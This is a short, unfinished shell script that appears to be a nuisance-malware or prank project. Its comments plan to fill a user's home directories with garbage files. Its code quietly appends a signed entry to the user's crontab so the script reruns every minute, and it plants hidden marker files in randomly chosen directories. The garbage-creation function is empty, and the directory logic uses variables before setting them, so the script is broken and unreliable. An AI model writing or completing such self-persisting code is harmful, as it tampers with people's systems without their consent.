#!/bin/sh

# 1 check if the crontab has been edited, if not edit it
# 1.1 crontab must remain as it was before but with 1 or 2 more new lines
# 1.2 a simple append (>>) should do the work
# 1.3 besides the working lines, add a comment line with a signature
# 1.4 after boot the program needs a sleep of at least 10 secs
# 1.5 then the program will run every minute or 30 seconds

# 2 find a dir where to create the garbage files
# 2.1 for each run of the program will be created a unique file in the folder
# 2.1 where the files have been created
# 2.2 when the file has been found, move it to the next folder
# 2.3 then will be created the next garbage files

# 3 create all the garbage
# 3.1 the program should create N files with all different names
# 3.1 N shouldn't be too big
# 3.1 furthermor the size of the files should be between 1K and 100K

SIGNATURE="aldisti"
NAME="$0"
ROOT="$HOME/"
UFILE=".$SIGNATURE"
TMP_FILE=".$SIGNATURE.tmp"
UFILE_DIR=""

setCrontab() {
	if [ $(crontab -l | grep "$SIGNATURE" | wc -l) -gt 0 ]; then
		echo "crontab marked" # toRemove
		return 0
	fi
	local comment="# this line has been added by $SIGNATURE"

	$(crontab -l > $TMP_FILE)
	$(echo $comment >> $TMP_FILE)
	$(echo '* * * * * sleep 5;' "$(pwd)/$0" >> $TMP_FILE)
	$(crontab $TMP_FILE)
	echo "crontab edited" # toRemove
	rm -f $TMP_FILE > /dev/null 2>&1
}

findDir() {
	local old_path="$(find $HOME -maxdepth 5 -name $UFILE)"
	local random=0
	local new_path=""

	if [ "$old_path" = "" ]; then
		random=$(expr $(od -A n -t d -N 1 /dev/random | awk '{print $1}') % $size)
		new_path="$(cat $TMP_FILE | head -$random | tail -1)"
		$(touch "$new_path/$UFILE")
		UFILE_DIR="$new_path"
	fi

	local size=$(($(echo "$old_path" | wc -c) - $(echo $UFILE | wc -c)))
	$(find $ROOT -maxdepth 4 -type d > $TMP_FILE)
	if [ "$old_path" = "" ]; then
		$(touch "")
	fi
	old_path="$(echo "$old_path" | head -c $size)"
	size=$(cat $TMP_FILE | wc -l)
	while true; do
		random=$(expr $(od -A n -t d -N 1 /dev/random | awk '{print $1}') % $size)
		if [ $random -gt $size ]; then
			continue
		fi
		new_path="$(cat $TMP_FILE | head -$random | tail -1)"
		if [ "$new_path" = "" ] || [ "$new_path" = "$old_path" ];then
			continue ;
		fi
		break
	done
	$(rm -f "$old_path$UFILE")
	$(touch "$new_path/$UFILE")
	UFILE_DIR="$new_path/"
}

createTrash() {
	
}

setCrontab
findDir

